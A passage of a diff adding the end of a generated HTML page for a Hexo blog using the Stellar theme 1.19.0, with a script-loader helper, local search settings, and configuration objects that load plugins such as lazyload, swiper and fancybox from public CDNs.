+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
